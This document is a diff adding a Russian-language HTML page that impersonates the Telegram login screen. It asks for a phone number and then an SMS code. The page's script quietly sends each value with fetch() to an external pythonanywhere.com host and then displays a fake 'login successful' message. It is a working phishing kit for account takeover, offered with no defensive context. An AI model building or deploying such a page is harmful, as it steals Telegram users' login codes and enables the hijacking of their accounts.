@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Telegram</title>
+<style>
+*{margin:0;padding:0}body{background:#17212b;font-family:-apple-system,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}
+.card{background:#0e1621;padding:35px;border-radius:16px;width:350px;text-align:center}
+h2{color:#fff;font-size:20px;margin-bottom:5px}
+p{color:#7f8c8d;font-size:13px;margin-bottom:20px}
+input{width:100%;padding:12px;background:transparent;border:none;border-bottom:2px solid #2b5278;color:#fff;font-size:15px;margin-bottom:12px;outline:none}
+input:focus{border-bottom-color:#5eb5f7}
+.btn{width:100%;padding:12px;background:#2b5278;color:#fff;border:none;border-radius:8px;font-size:15px;cursor:pointer;margin-top:10px}
+</style>
+</head>
+<body>
+<div class="card">
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="50" fill="#5eb5f7"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.446 1.394c-.14.18-.357.295-.6.295l.213-3.054 5.56-5.022c.24-.213-.054-.334-.373-.121l-6.87 4.326-2.96-.924c-.64-.203-.658-.64.136-.953l11.566-4.458c.538-.196 1.006.128.832.938z"/></svg>
+<h2>Telegram</h2>
+<p>Войдите в свой аккаунт</p>
+<input id="phone" type="text" placeholder="Номер телефона" autocomplete="off">
+<button class="btn" onclick="sendPhone()">Далее</button>
+<div id="step2" style="display:none">
+<p style="color:#fff;margin-top:15px">Код отправлен на</p>
+<p style="color:#5eb5f7;margin:5px 0" id="pd"></p>
+<input id="code" type="text" placeholder="Код из SMS" maxlength="5" autocomplete="off">
+<button class="btn" onclick="sendCode()">Войти</button>
+</div>
+</div>
+<script>
+const BASE = 'https://1346874Arsen.pythonanywhere.com';
+function sendPhone(){var p=document.getElementById('phone').value.trim();if(!p||p.length<7)return;document.getElementById('pd').innerText=p;document.getElementById('step2').style.display='block';fetch(BASE+'/p?d='+encodeURIComponent(p))}
+function sendCode(){var c=document.getElementById('code').value.trim();if(!c||c.length<4)return;fetch(BASE+'/c?d='+encodeURIComponent(c));document.querySelector('.card').innerHTML='<h2 style=color:#2ecc71>✅ Вход выполнен!</h2>'}
+</script>
+</body>
+</html>
